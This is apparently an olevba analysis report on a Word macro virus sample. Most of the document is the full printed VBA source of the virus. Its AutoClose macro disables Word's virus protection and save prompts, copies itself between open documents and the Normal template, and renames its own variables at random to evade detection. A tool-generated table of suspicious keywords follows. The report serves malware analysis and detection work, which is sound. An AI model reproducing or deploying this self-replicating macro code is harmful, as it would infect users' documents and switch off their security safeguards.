olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.au-140ade50e538a5aa91fcb9927082dad634f118af
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.au-140ade50e538a5aa91fcb9927082dad634f118af - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
TM7897 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
NC5373 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set UN9057 = ActiveDocument.VBProject.VBComponents.Item(1)
LU4796 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set UN9057 = NormalTemplate.VBProject.VBComponents.Item(1)
OA256 = True
Call ML4386_HH9857
End If
If OA256 <> True And LU4796 <> True Then GoTo QE4551
If OA256 = True Then UN9057.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TM7897 - 1))
If LU4796 = True Then UN9057.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, NC5373 - 1))
QE4551:
If NC5373 <> 0 And TM7897 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub ML4386_HH9857()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "NL4792": r1(2) = "JI2754": r1(3) = "PE9164": r1(4) = "PQ1472": r1(5) = "HH9857": r1(6) = "TM7897"
r1(7) = "NC5373": r1(8) = "LU4796":: r1(9) = "UN9057": r1(10) = "OA256": r1(11) = "QE4551": r1(12) = "ML4386": r1(13) = "SB543": r1(14) = "DG865"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call HH9857(a1, r1(x))
Next x
End Sub
Private Sub HH9857(DG865, SB543 As String)  'v1.0
On Error Resume Next
Dim NL4792 As Long: Dim JI2754 As Long: Dim PE9164 As Long: Dim PQ1472 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NL4792 = 1: JI2754 = 1: PE9164 = .CountOfLines: PQ1472 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SB543, NL4792, JI2754, PE9164, PQ1472, True)
strline = .Lines(NL4792, 1)
strline = Left(strline, JI2754 - 1) & DG865 & Mid(strline, PQ1472)
.replaceline NL4792, strline
NL4792 = PE9164 + 1: JI2754 = 1:
PE9164 = .CountOfLines
PQ1472 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

